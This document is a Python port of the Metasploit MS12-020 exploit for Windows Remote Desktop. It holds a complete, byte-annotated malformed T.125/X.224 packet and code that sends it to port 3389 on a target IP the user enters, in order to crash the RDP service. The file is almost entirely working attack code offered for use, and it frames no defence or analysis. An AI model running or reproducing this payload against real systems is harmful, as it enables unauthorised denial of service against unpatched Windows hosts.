"""
MS12_020_RDP.py - MS12_020_RDP exploit converted from ruby to python

Author: Levi Nachamni (levi0x0)
Date: 20/05/2014
Version: 0.1
License: GPL 3, Metasploit License
The Orginal Code: 
https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb

Description:
	MS12_020_RDP exploit converted from ruby to python

"""

MODULE_NAME = "MS12_020_RDP"
MODULE_AUTHOR = "Levi Nachamni (levi0x0), Luigi Auriemma  Daniel Godas-Lopez, Alex Ionescu, jduck"
MODULE_LICENSE = "GPL 3/Metasploit License"
MODULE_VERSION = "0.1"
MODULE_DESC = "MS12_020_RDP exploit converted from ruby to python"

from socket import *
import sys
import time
from api.std import *

#class exploit
class ms12_20(object):
	"""ms12-20 windows RDP DOS exploit"""

	def __init__(self, target,  pkg ):
		self.target = target #target
		self.pkg = pkg #payload code

	def test(self):
		self.s = socket(AF_INET ,SOCK_STREAM) #OPEN TCP/IPv4 SOCKET
		self.s.settimeout(5)
		self.test = self.s.connect_ex((self.target, 3389))
		self.s.close()
		if self.test == 0:
			notify("[*] PORT 3389:OPEN")
		else:
			notify("[*] PORT 3389:CLOSE or SERVER DOWN!\n")
			return False
		
		
	def exploit(self):
		print "[*] exploit.."
		self.s = socket(AF_INET ,SOCK_STREAM) #OPEN TCP/IPv4 SOCKET
		self.s.connect_ex((self.target, 3389)) #3389 default windows RDP port
		self.s.settimeout(4)
		self.s.send(self.pkg)
		self.recv = self.s.recv(50)
		self.s.close()
		notify("[*] done.")

#Payload to send 
max_channel_ids = "\x02\x01\xff"
pkg = "\x03\x00\x00\x13"   # TPKT: version  length
pkg += "\x0E\xE0\x00\x00"   # X.224 (connection request)
pkg += "\x00\x00\x00\x01" 
pkg += "\x00\x08\x00\x00" 
pkg += "\x00\x00\x00"     
pkg += "\x03\x00\x00\x6A"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224 (connect-initial)
pkg += "\x7F\x65\x82\x00"   # T.125
pkg += "\x5E"             
pkg += "\x04\x01\x01"       # callingDomainSelector
pkg += "\x04\x01\x01"       # calledDomainSelector
pkg += "\x01\x01\xFF"       # upwardFlag
pkg += "\x30\x19"           # targetParameters
pkg += max_channel_ids      # maxChannelIds
pkg += "\x02\x01\xFF"       # maxUserIds
pkg += "\x02\x01\x00"       # maxTokenIds
pkg += "\x02\x01\x01"       # numPriorities
pkg += "\x02\x01\x00"       # minThroughput
pkg += "\x02\x01\x01"       # maxHeight
pkg += "\x02\x02\x00\x7C"   # maxMCSPDUsize
pkg += "\x02\x01\x02"       # protocolVersion
pkg += "\x30\x19"           # minimumParameters
pkg += max_channel_ids      # maxChannelIds
pkg += "\x02\x01\xFF"       # maxUserIds
pkg += "\x02\x01\x00"       # maxTokenIds
pkg += "\x02\x01\x01"       # numPriorities
pkg += "\x02\x01\x00"       # minThroughput
pkg += "\x02\x01\x01"       # maxHeight
pkg += "\x02\x02\x00\x7C"   # maxMCSPDUsize
pkg += "\x02\x01\x02"       # protocolVersion
pkg += "\x30\x19"           # maximumParameters
pkg += max_channel_ids      # maxChannelIds
pkg += "\x02\x01\xFF"       # maxUserIds
pkg += "\x02\x01\x00"       # maxTokenIds
pkg += "\x02\x01\x01"       # numPriorities
pkg += "\x02\x01\x00"       # minThroughput
pkg += "\x02\x01\x01"       # maxHeight
pkg += "\x02\x02\x00\x7C"   # maxMCSPDUsize
pkg += "\x02\x01\x02"       # protocolVersion
pkg += "\x04\x82\x00\x00"   # userData
pkg += "\x03\x00\x00\x08"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x28"               # T.125
pkg += "\x03\x00\x00\x08"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x28"               # T.125
pkg += "\x03\x00\x00\x08"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x28"               # T.125
pkg += "\x03\x00\x00\x08"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x28"               # T.125
pkg += "\x03\x00\x00\x08"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x28"               # T.125
pkg += "\x03\x00\x00\x08"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x28"               # T.125
pkg += "\x03\x00\x00\x08"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x28"               # T.125
pkg += "\x03\x00\x00\x08"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x28"               # T.125
pkg += "\x03\x00\x00\x0C"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x38\x00\x06\x03"   # T.125
pkg += "\xF0"             
pkg += "\x03\x00\x00\x09"   # TPKT: version  length
pkg += "\x02\xF0\x80"       # X.224
pkg += "\x21\x80"            # T.125


def main():
	#starting
	try:
		target = raw_input("Target IP:")
		start = ms12_20(target,pkg)
		notify("[*] Checking RDP..")
		start.test()
		notify("[*] Sending %s bytes to %s:3389" % (len(pkg), target))
		start.exploit()
		time.sleep(2) #sleep 2 sec for the TimeOut
		notify("[*]exploit completed..")
		raw_input("Press any key to Quit.")
	
	except timeout:
		notify("[*] Server down!!\n")
	except KeyboardInterrupt:
		notify("\n [*] bye (:")
	except error:
		error("[-]Socket.Error connection Failed..")

